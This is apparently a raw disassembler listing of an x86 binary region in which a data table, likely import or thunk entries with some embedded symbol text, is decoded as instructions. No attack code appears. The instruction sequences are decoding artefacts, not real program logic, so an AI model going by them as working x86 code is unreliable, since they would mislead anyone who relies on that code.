  41d1ab:	add    BYTE PTR [esi-0x21],bh
  41d1ae:	add    DWORD PTR [eax],eax
  41d1b0:	mov    edi,ds
  41d1b2:	add    DWORD PTR [eax],eax
  41d1b4:	cwde   
  41d1b5:	fild   WORD PTR [ecx]
  41d1b7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d1bd:	fild   WORD PTR [ecx]
  41d1bf:	add    dh,al
  41d1c1:	fild   WORD PTR [ecx]
  41d1c3:	add    dh,dl
  41d1c5:	fild   WORD PTR [ecx]
  41d1c7:	add    dh,ah
  41d1c9:	fild   WORD PTR [ecx]
  41d1cb:	add    ah,bh
  41d1cd:	fild   WORD PTR [ecx]
  41d1cf:	add    BYTE PTR [eax],cl
  41d1d1:	loopne 0x41d1d4
  41d1d3:	add    BYTE PTR [eax+eiz*8],dl
  41d1d6:	add    DWORD PTR [eax],eax
  41d1d8:	sub    al,ah
  41d1da:	add    DWORD PTR [eax],eax
  41d1dc:	ds loopne 0x41d1e0
  41d1df:	add    BYTE PTR [esi-0x20],dl
  41d1e2:	add    DWORD PTR [eax],eax
  41d1e4:	data16 loopne 0x41d1e8
  41d1e7:	add    BYTE PTR [edx-0x20],dh
  41d1ea:	add    DWORD PTR [eax],eax
  41d1ec:	xchg   al,ah
  41d1ee:	add    DWORD PTR [eax],eax
  41d1f0:	xchg   esp,eax
  41d1f1:	loopne 0x41d1f4
  41d1f3:	add    BYTE PTR [esi-0x47fffe20],ch
  41d1f9:	loopne 0x41d1fc
  41d1fb:	add    dl,cl
  41d1fd:	loopne 0x41d200
  41d1ff:	add    ah,bl
  41d201:	loopne 0x41d204
  41d203:	add    dh,ch
  41d205:	loopne 0x41d208
  41d207:	add    dh,bh
  41d209:	loopne 0x41d20c
  41d20b:	add    BYTE PTR [eax],cl
  41d20d:	loope  0x41d210
  41d20f:	add    BYTE PTR [esi],bl
  41d211:	loope  0x41d214
  41d213:	add    BYTE PTR [edx],dh
  41d215:	loope  0x41d218
  41d217:	add    BYTE PTR [esi-0x1f],al
  41d21a:	add    DWORD PTR [eax],eax
  41d21c:	push   esi
  41d21d:	loope  0x41d220
  41d21f:	add    BYTE PTR [esi-0x1f],ah
  41d222:	add    DWORD PTR [eax],eax
  41d224:	jb     0x41d207
  41d226:	add    DWORD PTR [eax],eax
  41d228:	test   cl,ah
  41d22a:	add    DWORD PTR [eax],eax
  41d22c:	mov    al,ds:0xb60001e1
  41d231:	loope  0x41d234
  41d233:	add    dl,al
  41d235:	loope  0x41d238
  41d237:	add    dh,dl
  41d239:	loope  0x41d23c
  41d23b:	add    BYTE PTR [eax],al
  41d23d:	add    BYTE PTR [eax],al
  41d23f:	add    ah,dh
  41d241:	loope  0x41d244
  41d243:	add    BYTE PTR [edx+eiz*8],al
  41d246:	add    DWORD PTR [eax],eax
  41d248:	adc    al,0xe2
  41d24a:	add    DWORD PTR [eax],eax
  41d24c:	and    ah,dl
  41d24e:	add    DWORD PTR [eax],eax
  41d250:	xor    dl,ah
  41d252:	add    DWORD PTR [eax],eax
  41d254:	ds loop 0x41d258
  41d257:	add    BYTE PTR [edx-0x1e],dl
  41d25a:	add    DWORD PTR [eax],eax
  41d25c:	pusha  
  41d25d:	loop   0x41d260
  41d25f:	add    BYTE PTR [edx-0x1e],bh
  41d262:	add    DWORD PTR [eax],eax
  41d264:	xchg   dl,ah
  41d266:	add    DWORD PTR [eax],eax
  41d268:	cwde   
  41d269:	loop   0x41d26c
  41d26b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d272:	add    DWORD PTR [eax],eax
  41d274:	int3   
  41d275:	loop   0x41d278
  41d277:	add    dh,dl
  41d279:	loop   0x41d27c
  41d27b:	add    al,ah
  41d27d:	loop   0x41d280
  41d27f:	add    dl,bh
  41d281:	loop   0x41d284
  41d283:	add    BYTE PTR [edx],cl
  41d285:	jecxz  0x41d288
  41d287:	add    BYTE PTR [edx],bl
  41d289:	jecxz  0x41d28c
  41d28b:	add    BYTE PTR [ebx+eiz*8],ah
  41d28e:	add    DWORD PTR [eax],eax
  41d290:	xor    al,0xe3
  41d292:	add    DWORD PTR [eax],eax
  41d294:	inc    eax
  41d295:	jecxz  0x41d298
  41d297:	add    BYTE PTR [esi-0x1d],cl
  41d29a:	add    DWORD PTR [eax],eax
  41d29c:	fs jecxz 0x41d2a0
  41d29f:	add    BYTE PTR [esi-0x1d],dh
  41d2a2:	add    DWORD PTR [eax],eax
  41d2a4:	mov    fs,ebx
  41d2a6:	add    DWORD PTR [eax],eax
  41d2a8:	mov    ds:0xb00001e3,al
  41d2ad:	jecxz  0x41d2b0
  41d2af:	add    dl,al
  41d2b1:	jecxz  0x41d2b4
  41d2b3:	add    dh,cl
  41d2b5:	jecxz  0x41d2b8
  41d2b7:	add    dh,bl
  41d2b9:	jecxz  0x41d2bc
  41d2bb:	add    ah,ch
  41d2bd:	jecxz  0x41d2c0
  41d2bf:	add    BYTE PTR [eax],al
  41d2c1:	in     al,0x1
  41d2c3:	add    BYTE PTR [esi],cl
  41d2c5:	in     al,0x1
  41d2c7:	add    BYTE PTR [edx],ch
  41d2c9:	in     al,0x1
  41d2cb:	add    BYTE PTR [esp+eiz*8],bh
  41d2ce:	add    DWORD PTR [eax],eax
  41d2d0:	dec    esp
  41d2d1:	in     al,0x1
  41d2d3:	add    BYTE PTR [esi-0x1c],bl
  41d2d6:	add    DWORD PTR [eax],eax
  41d2d8:	push   0xffffffe4
  41d2da:	add    DWORD PTR [eax],eax
  41d2dc:	jl     0x41d2c2
  41d2de:	add    DWORD PTR [eax],eax
  41d2e0:	mov    ah,ah
  41d2e2:	add    DWORD PTR [eax],eax
  41d2e4:	cwde   
  41d2e5:	in     al,0x1
  41d2e7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d2ed:	in     al,0x1
  41d2ef:	add    al,dl
  41d2f1:	in     al,0x1
  41d2f3:	add    dl,ah
  41d2f5:	in     al,0x1
  41d2f7:	add    al,dh
  41d2f9:	in     al,0x1
  41d2fb:	add    BYTE PTR [eax],cl
  41d2fd:	in     eax,0x1
  41d2ff:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d306:	add    DWORD PTR [eax],eax
  41d308:	ds in  eax,0x1
  41d30b:	add    BYTE PTR [edx-0x1b],cl
  41d30e:	add    DWORD PTR [eax],eax
  41d310:	pop    edx
  41d311:	in     eax,0x1
  41d313:	add    BYTE PTR [esi-0x1b],ch
  41d316:	add    DWORD PTR [eax],eax
  41d318:	jle    0x41d2ff
  41d31a:	add    DWORD PTR [eax],eax
  41d31c:	nop
  41d31d:	in     eax,0x1
  41d31f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d326:	add    DWORD PTR [eax],eax
  41d328:	mov    eax,0xca0001e5
  41d32d:	in     eax,0x1
  41d32f:	add    dl,bl
  41d331:	in     eax,0x1
  41d333:	add    dh,ah
  41d335:	in     eax,0x1
  41d337:	add    ah,bh
  41d339:	in     eax,0x1
  41d33b:	add    BYTE PTR [esi],cl
  41d33d:	out    0x1,al
  41d33f:	add    BYTE PTR [eax],ch
  41d341:	out    0x1,al
  41d343:	add    BYTE PTR [edx],bh
  41d345:	out    0x1,al
  41d347:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d34b:	add    BYTE PTR [eax-0x1a],bl
  41d34e:	add    DWORD PTR [eax],eax
  41d350:	push   0x7a0001e6
  41d355:	out    0x1,al
  41d357:	add    BYTE PTR [esi-0x67fffe1a],al
  41d35d:	out    0x1,al
  41d35f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d365:	out    0x1,al
  41d367:	add    ah,bl
  41d369:	out    0x1,al
  41d36b:	add    dl,ch
  41d36d:	out    0x1,al
  41d36f:	add    al,bh
  41d371:	out    0x1,al
  41d373:	add    BYTE PTR [esi],cl
  41d375:	out    0x1,eax
  41d377:	add    BYTE PTR [esi],bl
  41d379:	out    0x1,eax
  41d37b:	add    BYTE PTR [edx],ch
  41d37d:	out    0x1,eax
  41d37f:	add    BYTE PTR [edx],bh
  41d381:	out    0x1,eax
  41d383:	add    BYTE PTR [edx-0x19],cl
  41d386:	add    DWORD PTR [eax],eax
  41d388:	pop    esp
  41d389:	out    0x1,eax
  41d38b:	add    BYTE PTR [eax-0x19],ch
  41d38e:	add    DWORD PTR [eax],eax
  41d390:	jbe    0x41d379
  41d392:	add    DWORD PTR [eax],eax
  41d394:	xchg   bh,ah
  41d396:	add    DWORD PTR [eax],eax
  41d398:	cwde   
  41d399:	out    0x1,eax
  41d39b:	add    BYTE PTR [eax-0x45fffe19],ch
  41d3a1:	out    0x1,eax
  41d3a3:	add    al,dl
  41d3a5:	out    0x1,eax
  41d3a7:	add    dh,ah
  41d3a9:	out    0x1,eax
  41d3ab:	add    dh,dh
  41d3ad:	out    0x1,eax
  41d3af:	add    BYTE PTR [edx],al
  41d3b1:	call   0xe859d3b7
  41d3b6:	add    DWORD PTR [eax],eax
  41d3b8:	and    al,0xe8
  41d3ba:	add    DWORD PTR [eax],eax
  41d3bc:	xor    al,0xe8
  41d3be:	add    DWORD PTR [eax],eax
  41d3c0:	dec    eax
  41d3c1:	call   0xe897d3c7
  41d3c6:	add    DWORD PTR [eax],eax
  41d3c8:	callw  0xd3cd
  41d3cc:	jp     0x41d3b6
  41d3ce:	add    DWORD PTR [eax],eax
  41d3d0:	xchg   al,ch
  41d3d2:	add    DWORD PTR [eax],eax
  41d3d4:	xchg   esi,eax
  41d3d5:	call   0xe8e3d3db
  41d3da:	add    DWORD PTR [eax],eax
  41d3dc:	mov    dl,0xe8
  41d3de:	add    DWORD PTR [eax],eax
  41d3e0:	(bad)  
  41d3e1:	call   0xe913d3e7
  41d3e6:	add    DWORD PTR [eax],eax
  41d3e8:	in     al,0xe8
  41d3ea:	add    DWORD PTR [eax],eax
  41d3ec:	lock call 0xe93fd3f3
  41d3f2:	add    DWORD PTR [eax],eax
  41d3f4:	or     al,0xe9
  41d3f6:	add    DWORD PTR [eax],eax
  41d3f8:	sbb    ch,cl
  41d3fa:	add    DWORD PTR [eax],eax
  41d3fc:	add    BYTE PTR [eax],al
  41d3fe:	add    BYTE PTR [eax],al
  41d400:	or     al,0x2
  41d402:	add    BYTE PTR [eax+0x0],al
  41d408:	add    BYTE PTR [eax],al
  41d40a:	add    BYTE PTR [eax],al
  41d40c:	das    
  41d40d:	and    DWORD PTR [ecx*2+0x0],edx
  41d414:	add    al,BYTE PTR [eax]
  41d416:	add    BYTE PTR [eax],al
  41d418:	pop    ebp
  41d419:	add    BYTE PTR [eax],al
  41d41b:	add    BYTE PTR [ebx+ebp*4+0x2],dl
  41d41f:	add    BYTE PTR [ebp+ebx*4+0x2],dl
	...
  41d42b:	add    BYTE PTR [edi],ch
  41d42d:	and    DWORD PTR [ecx*2+0x0],edx
  41d434:	pop    edx
  41d435:	aam    0x1
  41d437:	add    BYTE PTR [ecx],al
  41d439:	add    BYTE PTR [eax],al
  41d43b:	add    BYTE PTR [ecx],al
  41d43d:	add    BYTE PTR [eax],al
  41d43f:	add    BYTE PTR [ecx],al
  41d441:	add    BYTE PTR [eax],al
  41d443:	add    BYTE PTR [eax-0x2c],dl
  41d446:	add    DWORD PTR [eax],eax
  41d448:	push   esp
  41d449:	aam    0x1
  41d44b:	add    BYTE PTR [eax-0x2c],bl
  41d44e:	add    DWORD PTR [eax],eax
  41d450:	xchg   edi,eax
  41d451:	inc    ebx
  41d452:	add    BYTE PTR [eax],al
  41d454:	imul   edx,esp,0x1
  41d457:	add    BYTE PTR [eax],al
  41d459:	add    BYTE PTR [eax+ebp*2+0x58],ah
  41d45d:	xor    dl,BYTE PTR [eax+0x78]
  41d460:	jp     0x41d4aa
  41d462:	jp     0x41d4d5
  41d464:	outs   dx,BYTE PTR ds:[esi]
  41d465:	je     0x41d495
  41d467:	je     0x41d4d2
  41d469:	jo     0x41d46b
  41d46b:	aas    
  41d46c:	dec    eax
  41d46d:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  41d475:	gs jb  0x41d4c7
  41d478:	jb     0x41d4e3
  41d47a:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  41d482:	inc    edi
  41d483:	inc    esi
  41d484:	dec    ebx
  41d485:	push   eax
  41d486:	inc    ecx
  41d487:	dec    ecx
  41d488:	push   eax
  41d489:	inc    ecx
  41d48a:	inc    esp
  41d48b:	cmp    al,0x56
	...
  41d495:	add    BYTE PTR [eax],al
  41d497:	add    BYTE PTR [eax],dl
  41d499:	aad    0x1
	...
  41d4a3:	add    BYTE PTR [esi],al
  41d4a5:	fild   DWORD PTR [ecx]
  41d4a7:	add    BYTE PTR [eax],al
  41d4a9:	rol    BYTE PTR [ecx],1
  41d4ab:	add    ah,al
  41d4ad:	aad    0x1
	...
  41d4b7:	add    BYTE PTR [edx-0x4bfffe22],dh
  41d4bd:	rol    BYTE PTR [ecx],1
  41d4bf:	add    BYTE PTR [eax+0x1d6],dl
  41d4c5:	add    BYTE PTR [eax],al
  41d4c7:	add    BYTE PTR [eax],al
  41d4c9:	add    BYTE PTR [eax],al
  41d4cb:	add    dl,ch
  41d4cd:	loope  0x41d4d0
  41d4cf:	add    BYTE PTR [eax+0x500001d1],al
  41d4d5:	xlat   BYTE PTR ds:[ebx]
  41d4d6:	add    DWORD PTR [eax],eax
	...
  41d4e0:	ss jmp 0xd281d4e7
  41d4e6:	add    DWORD PTR [eax],eax
  41d4e8:	adc    cl,bl
  41d4ea:	add    DWORD PTR [eax],eax
	...
  41d4f4:	inc    edx
  41d4f5:	jmp    0xd441d4fb
  41d4fa:	add    DWORD PTR [eax],eax
	...
  41d510:	sbb    cl,bl
  41d512:	add    DWORD PTR [eax],eax
  41d514:	fld    DWORD PTR es:[ecx]
  41d517:	add    BYTE PTR [eax],dh
  41d519:	fld    DWORD PTR [ecx]
  41d51b:	add    BYTE PTR [edx],bh
  41d51d:	fld    DWORD PTR [ecx]
  41d51f:	add    BYTE PTR [edx-0x27],al
  41d522:	add    DWORD PTR [eax],eax
  41d524:	dec    esp
  41d525:	fld    DWORD PTR [ecx]
  41d527:	add    BYTE PTR [eax-0x27],bl
  41d52a:	add    DWORD PTR [eax],eax
  41d52c:	(bad)  
  41d52d:	fld    DWORD PTR [ecx]
  41d52f:	add    BYTE PTR [ecx+ebx*8+0x1],ch
  41d533:	add    BYTE PTR [eax-0x27],bh
  41d536:	add    DWORD PTR [eax],eax
  41d538:	sbb    cl,0x1
  41d53b:	add    BYTE PTR [eax-0x65fffe27],cl
  41d541:	fld    DWORD PTR [ecx]
  41d543:	add    BYTE PTR [eax-0x4dfffe27],ch
  41d549:	fld    DWORD PTR [ecx]
  41d54b:	add    BYTE PTR [ecx+ebx*8-0x2639ffff],bh
  41d552:	add    DWORD PTR [eax],eax
  41d554:	rcr    cl,1
  41d556:	add    DWORD PTR [eax],eax
  41d558:	loopne 0x41d533
  41d55a:	add    DWORD PTR [eax],eax
  41d55c:	jmp    0x1d9:0xf80001d9
  41d563:	add    BYTE PTR [edx+ebx*8],al
  41d566:	add    DWORD PTR [eax],eax
  41d568:	push   cs
  41d569:	fiadd  DWORD PTR [ecx]
  41d56b:	add    BYTE PTR [edx],bl
  41d56d:	fiadd  DWORD PTR [ecx]
  41d56f:	add    BYTE PTR [edx+ebx*8],ah
  41d572:	add    DWORD PTR [eax],eax
  41d574:	fiadd  DWORD PTR cs:[ecx]
  41d577:	add    BYTE PTR [eax],bh
  41d579:	fiadd  DWORD PTR [ecx]
  41d57b:	add    BYTE PTR [eax-0x26],al
  41d57e:	add    DWORD PTR [eax],eax
  41d580:	dec    esi
  41d581:	fiadd  DWORD PTR [ecx]
  41d583:	add    BYTE PTR [eax-0x26],bl
  41d586:	add    DWORD PTR [eax],eax
  41d588:	fiadd  DWORD PTR fs:[ecx]
  41d58b:	add    BYTE PTR [esi-0x26],ch
  41d58e:	add    DWORD PTR [eax],eax
  41d590:	js     0x41d56c
  41d592:	add    DWORD PTR [eax],eax
  41d594:	xchg   dl,bl
  41d596:	add    DWORD PTR [eax],eax
  41d598:	mov    ds,edx
  41d59a:	add    DWORD PTR [eax],eax
  41d59c:	call   0x1da:0xa40001da
  41d5a3:	add    BYTE PTR [esi-0x47fffe26],ch
  41d5a9:	fiadd  DWORD PTR [ecx]
  41d5ab:	add    ah,cl
  41d5ad:	fiadd  DWORD PTR [ecx]
  41d5af:	add    ah,bl
  41d5b1:	fiadd  DWORD PTR [ecx]
  41d5b3:	add    al,ch
  41d5b5:	fiadd  DWORD PTR [ecx]
  41d5b7:	add    dl,dh
  41d5b9:	fiadd  DWORD PTR [ecx]
  41d5bb:	add    ah,bh
  41d5bd:	fiadd  DWORD PTR [ecx]
  41d5bf:	add    BYTE PTR [eax],al
  41d5c1:	add    BYTE PTR [eax],al
  41d5c3:	add    BYTE PTR [edx],dl
  41d5c5:	fild   DWORD PTR [ecx]
  41d5c7:	add    BYTE PTR [eax],dh
  41d5c9:	fild   DWORD PTR [ecx]
  41d5cb:	add    BYTE PTR [eax-0x25],cl
  41d5ce:	add    DWORD PTR [eax],eax
  41d5d0:	push   0x7a0001db
  41d5d5:	fild   DWORD PTR [ecx]
  41d5d7:	add    BYTE PTR [edx-0x57fffe25],cl
  41d5dd:	fild   DWORD PTR [ecx]
  41d5df:	add    dl,al
  41d5e1:	fild   DWORD PTR [ecx]
  41d5e3:	add    dh,dl
  41d5e5:	fild   DWORD PTR [ecx]
  41d5e7:	add    dh,ah
  41d5e9:	fild   DWORD PTR [ecx]
  41d5eb:	add    BYTE PTR [edx],al
  41d5ed:	fadd   QWORD PTR [ecx]
  41d5ef:	add    BYTE PTR [esp+ebx*8],bl
  41d5f2:	add    DWORD PTR [eax],eax
  41d5f4:	sub    al,0xdc
  41d5f6:	add    DWORD PTR [eax],eax
  41d5f8:	cmp    bl,ah
  41d5fa:	add    DWORD PTR [eax],eax
  41d5fc:	dec    esi
  41d5fd:	fadd   QWORD PTR [ecx]
  41d5ff:	add    BYTE PTR [edx-0x24],bl
  41d602:	add    DWORD PTR [eax],eax
  41d604:	data16 fadd QWORD PTR [ecx]
  41d607:	add    BYTE PTR [eax-0x24],bh
  41d60a:	add    DWORD PTR [eax],eax
  41d60c:	mov    bl,ah
  41d60e:	add    DWORD PTR [eax],eax
  41d610:	pushf  
  41d611:	fadd   QWORD PTR [ecx]
  41d613:	add    BYTE PTR [esi-0x3ffffe24],ch
  41d619:	fadd   QWORD PTR [ecx]
  41d61b:	add    ah,cl
  41d61d:	fadd   QWORD PTR [ecx]
  41d61f:	add    al,ah
  41d621:	fadd   QWORD PTR [ecx]
  41d623:	add    ah,dh
  41d625:	fadd   QWORD PTR [ecx]
  41d627:	add    BYTE PTR [esi],al
  41d629:	fld    QWORD PTR [ecx]
  41d62b:	add    BYTE PTR [esi],dl
  41d62d:	fld    QWORD PTR [ecx]
  41d62f:	add    BYTE PTR [ebx*8-0x22c3ffff],ah
  41d636:	add    DWORD PTR [eax],eax
  41d638:	dec    edx
  41d639:	fld    QWORD PTR [ecx]
  41d63b:	add    BYTE PTR [eax-0x23],bl
  41d63e:	add    DWORD PTR [eax],eax
  41d640:	pusha  
  41d641:	fld    QWORD PTR [ecx]
  41d643:	add    BYTE PTR [esi-0x23],ch
  41d646:	add    DWORD PTR [eax],eax
  41d648:	test   ch,bl
  41d64a:	add    DWORD PTR [eax],eax
  41d64c:	mov    ds,ebp
  41d64e:	add    DWORD PTR [eax],eax
  41d650:	sahf   
  41d651:	fld    QWORD PTR [ecx]
  41d653:	add    BYTE PTR [ebp+ebx*8-0x2239ffff],dh
  41d65a:	add    DWORD PTR [eax],eax
  41d65c:	fcmovu st,st(5)
  41d65e:	add    DWORD PTR [eax],eax
  41d660:	out    dx,al
  41d661:	fld    QWORD PTR [ecx]
  41d663:	add    ah,bh
  41d665:	fld    QWORD PTR [ecx]
  41d667:	add    BYTE PTR [eax],cl
  41d669:	fiadd  WORD PTR [ecx]
  41d66b:	add    BYTE PTR [eax],ah
  41d66d:	fiadd  WORD PTR [ecx]
  41d66f:	add    BYTE PTR [edx],dh
  41d671:	fiadd  WORD PTR [ecx]
  41d673:	add    BYTE PTR [edx-0x22],cl
  41d676:	add    DWORD PTR [eax],eax
  41d678:	pop    esp
  41d679:	fiadd  WORD PTR [ecx]
  41d67b:	add    BYTE PTR [esi+ebx*8+0x1],dh
  41d67f:	add    BYTE PTR [edx-0x71fffe22],al
  41d685:	fiadd  WORD PTR [ecx]
  41d687:	add    BYTE PTR [edx+0x1de],ah
  41d68d:	add    BYTE PTR [eax],al
  41d68f:	add    al,al
  41d691:	fiadd  WORD PTR [ecx]
  41d693:	add    dl,cl
  41d695:	fiadd  WORD PTR [ecx]
  41d697:	add    ah,dl
  41d699:	fiadd  WORD PTR [ecx]
  41d69b:	add    al,ah
  41d69d:	fiadd  WORD PTR [ecx]
  41d69f:	add    ah,dh
  41d6a1:	fiadd  WORD PTR [ecx]
  41d6a3:	add    BYTE PTR [eax],al
  41d6a5:	fild   WORD PTR [ecx]
  41d6a7:	add    BYTE PTR [edx],bl
  41d6a9:	fild   WORD PTR [ecx]
  41d6ab:	add    BYTE PTR [edx],ch
  41d6ad:	fild   WORD PTR [ecx]
  41d6af:	add    BYTE PTR [eax],bh
  41d6b1:	fild   WORD PTR [ecx]
  41d6b3:	add    BYTE PTR [eax-0x21],dl
  41d6b6:	add    DWORD PTR [eax],eax
  41d6b8:	fild   WORD PTR fs:[ecx]
  41d6bb:	add    BYTE PTR [esi-0x21],bh
  41d6be:	add    DWORD PTR [eax],eax
  41d6c0:	mov    edi,ds
  41d6c2:	add    DWORD PTR [eax],eax
  41d6c4:	cwde   
  41d6c5:	fild   WORD PTR [ecx]
  41d6c7:	add    BYTE PTR [esi-0x45fffe21],ah
  41d6cd:	fild   WORD PTR [ecx]
  41d6cf:	add    dh,al
  41d6d1:	fild   WORD PTR [ecx]
  41d6d3:	add    dh,dl
  41d6d5:	fild   WORD PTR [ecx]
  41d6d7:	add    dh,ah
  41d6d9:	fild   WORD PTR [ecx]
  41d6db:	add    ah,bh
  41d6dd:	fild   WORD PTR [ecx]
  41d6df:	add    BYTE PTR [eax],cl
  41d6e1:	loopne 0x41d6e4
  41d6e3:	add    BYTE PTR [eax+eiz*8],dl
  41d6e6:	add    DWORD PTR [eax],eax
  41d6e8:	sub    al,ah
  41d6ea:	add    DWORD PTR [eax],eax
  41d6ec:	ds loopne 0x41d6f0
  41d6ef:	add    BYTE PTR [esi-0x20],dl
  41d6f2:	add    DWORD PTR [eax],eax
  41d6f4:	data16 loopne 0x41d6f8
  41d6f7:	add    BYTE PTR [edx-0x20],dh
  41d6fa:	add    DWORD PTR [eax],eax
  41d6fc:	xchg   al,ah
  41d6fe:	add    DWORD PTR [eax],eax
  41d700:	xchg   esp,eax
  41d701:	loopne 0x41d704
  41d703:	add    BYTE PTR [esi-0x47fffe20],ch
  41d709:	loopne 0x41d70c
  41d70b:	add    dl,cl
  41d70d:	loopne 0x41d710
  41d70f:	add    ah,bl
  41d711:	loopne 0x41d714
  41d713:	add    dh,ch
  41d715:	loopne 0x41d718
  41d717:	add    dh,bh
  41d719:	loopne 0x41d71c
  41d71b:	add    BYTE PTR [eax],cl
  41d71d:	loope  0x41d720
  41d71f:	add    BYTE PTR [esi],bl
  41d721:	loope  0x41d724
  41d723:	add    BYTE PTR [edx],dh
  41d725:	loope  0x41d728
  41d727:	add    BYTE PTR [esi-0x1f],al
  41d72a:	add    DWORD PTR [eax],eax
  41d72c:	push   esi
  41d72d:	loope  0x41d730
  41d72f:	add    BYTE PTR [esi-0x1f],ah
  41d732:	add    DWORD PTR [eax],eax
  41d734:	jb     0x41d717
  41d736:	add    DWORD PTR [eax],eax
  41d738:	test   cl,ah
  41d73a:	add    DWORD PTR [eax],eax
  41d73c:	mov    al,ds:0xb60001e1
  41d741:	loope  0x41d744
  41d743:	add    dl,al
  41d745:	loope  0x41d748
  41d747:	add    dh,dl
  41d749:	loope  0x41d74c
  41d74b:	add    BYTE PTR [eax],al
  41d74d:	add    BYTE PTR [eax],al
  41d74f:	add    ah,dh
  41d751:	loope  0x41d754
  41d753:	add    BYTE PTR [edx+eiz*8],al
  41d756:	add    DWORD PTR [eax],eax
  41d758:	adc    al,0xe2
  41d75a:	add    DWORD PTR [eax],eax
  41d75c:	and    ah,dl
  41d75e:	add    DWORD PTR [eax],eax
  41d760:	xor    dl,ah
  41d762:	add    DWORD PTR [eax],eax
  41d764:	ds loop 0x41d768
  41d767:	add    BYTE PTR [edx-0x1e],dl
  41d76a:	add    DWORD PTR [eax],eax
  41d76c:	pusha  
  41d76d:	loop   0x41d770
  41d76f:	add    BYTE PTR [edx-0x1e],bh
  41d772:	add    DWORD PTR [eax],eax
  41d774:	xchg   dl,ah
  41d776:	add    DWORD PTR [eax],eax
  41d778:	cwde   
  41d779:	loop   0x41d77c
  41d77b:	add    BYTE PTR [edx+eiz*8-0x1d47ffff],ah
  41d782:	add    DWORD PTR [eax],eax
  41d784:	int3   
  41d785:	loop   0x41d788
  41d787:	add    dh,dl
  41d789:	loop   0x41d78c
  41d78b:	add    al,ah
  41d78d:	loop   0x41d790
  41d78f:	add    dl,bh
  41d791:	loop   0x41d794
  41d793:	add    BYTE PTR [edx],cl
  41d795:	jecxz  0x41d798
  41d797:	add    BYTE PTR [edx],bl
  41d799:	jecxz  0x41d79c
  41d79b:	add    BYTE PTR [ebx+eiz*8],ah
  41d79e:	add    DWORD PTR [eax],eax
  41d7a0:	xor    al,0xe3
  41d7a2:	add    DWORD PTR [eax],eax
  41d7a4:	inc    eax
  41d7a5:	jecxz  0x41d7a8
  41d7a7:	add    BYTE PTR [esi-0x1d],cl
  41d7aa:	add    DWORD PTR [eax],eax
  41d7ac:	fs jecxz 0x41d7b0
  41d7af:	add    BYTE PTR [esi-0x1d],dh
  41d7b2:	add    DWORD PTR [eax],eax
  41d7b4:	mov    fs,ebx
  41d7b6:	add    DWORD PTR [eax],eax
  41d7b8:	mov    ds:0xb00001e3,al
  41d7bd:	jecxz  0x41d7c0
  41d7bf:	add    dl,al
  41d7c1:	jecxz  0x41d7c4
  41d7c3:	add    dh,cl
  41d7c5:	jecxz  0x41d7c8
  41d7c7:	add    dh,bl
  41d7c9:	jecxz  0x41d7cc
  41d7cb:	add    ah,ch
  41d7cd:	jecxz  0x41d7d0
  41d7cf:	add    BYTE PTR [eax],al
  41d7d1:	in     al,0x1
  41d7d3:	add    BYTE PTR [esi],cl
  41d7d5:	in     al,0x1
  41d7d7:	add    BYTE PTR [edx],ch
  41d7d9:	in     al,0x1
  41d7db:	add    BYTE PTR [esp+eiz*8],bh
  41d7de:	add    DWORD PTR [eax],eax
  41d7e0:	dec    esp
  41d7e1:	in     al,0x1
  41d7e3:	add    BYTE PTR [esi-0x1c],bl
  41d7e6:	add    DWORD PTR [eax],eax
  41d7e8:	push   0xffffffe4
  41d7ea:	add    DWORD PTR [eax],eax
  41d7ec:	jl     0x41d7d2
  41d7ee:	add    DWORD PTR [eax],eax
  41d7f0:	mov    ah,ah
  41d7f2:	add    DWORD PTR [eax],eax
  41d7f4:	cwde   
  41d7f5:	in     al,0x1
  41d7f7:	add    BYTE PTR [esi-0x3ffffe1c],ch
  41d7fd:	in     al,0x1
  41d7ff:	add    al,dl
  41d801:	in     al,0x1
  41d803:	add    dl,ah
  41d805:	in     al,0x1
  41d807:	add    al,dh
  41d809:	in     al,0x1
  41d80b:	add    BYTE PTR [eax],cl
  41d80d:	in     eax,0x1
  41d80f:	add    BYTE PTR [eiz*8-0x1ad5ffff],bl
  41d816:	add    DWORD PTR [eax],eax
  41d818:	ds in  eax,0x1
  41d81b:	add    BYTE PTR [edx-0x1b],cl
  41d81e:	add    DWORD PTR [eax],eax
  41d820:	pop    edx
  41d821:	in     eax,0x1
  41d823:	add    BYTE PTR [esi-0x1b],ch
  41d826:	add    DWORD PTR [eax],eax
  41d828:	jle    0x41d80f
  41d82a:	add    DWORD PTR [eax],eax
  41d82c:	nop
  41d82d:	in     eax,0x1
  41d82f:	add    BYTE PTR [ebp+eiz*8-0x1a55ffff],bl
  41d836:	add    DWORD PTR [eax],eax
  41d838:	mov    eax,0xca0001e5
  41d83d:	in     eax,0x1
  41d83f:	add    dl,bl
  41d841:	in     eax,0x1
  41d843:	add    dh,ah
  41d845:	in     eax,0x1
  41d847:	add    ah,bh
  41d849:	in     eax,0x1
  41d84b:	add    BYTE PTR [esi],cl
  41d84d:	out    0x1,al
  41d84f:	add    BYTE PTR [eax],ch
  41d851:	out    0x1,al
  41d853:	add    BYTE PTR [edx],bh
  41d855:	out    0x1,al
  41d857:	add    BYTE PTR [esi+eiz*8+0x1],cl
  41d85b:	add    BYTE PTR [eax-0x1a],bl
  41d85e:	add    DWORD PTR [eax],eax
  41d860:	push   0x7a0001e6
  41d865:	out    0x1,al
  41d867:	add    BYTE PTR [esi-0x67fffe1a],al
  41d86d:	out    0x1,al
  41d86f:	add    BYTE PTR [edx-0x35fffe1a],dh
  41d875:	out    0x1,al
  41d877:	add    ah,bl
  41d879:	out    0x1,al
  41d87b:	add    dl,ch
  41d87d:	out    0x1,al
  41d87f:	add    al,bh
  41d881:	out    0x1,al
  41d883:	add    BYTE PTR [esi],cl
  41d885:	out    0x1,eax
  41d887:	add    BYTE PTR [esi],bl
  41d889:	out    0x1,eax
  41d88b:	add    BYTE PTR [edx],ch
  41d88d:	out    0x1,eax
  41d88f:	add    BYTE PTR [edx],bh
  41d891:	out    0x1,eax
  41d893:	add    BYTE PTR [edx-0x19],cl
  41d896:	add    DWORD PTR [eax],eax
  41d898:	pop    esp
  41d899:	out    0x1,eax
  41d89b:	add    BYTE PTR [eax-0x19],ch
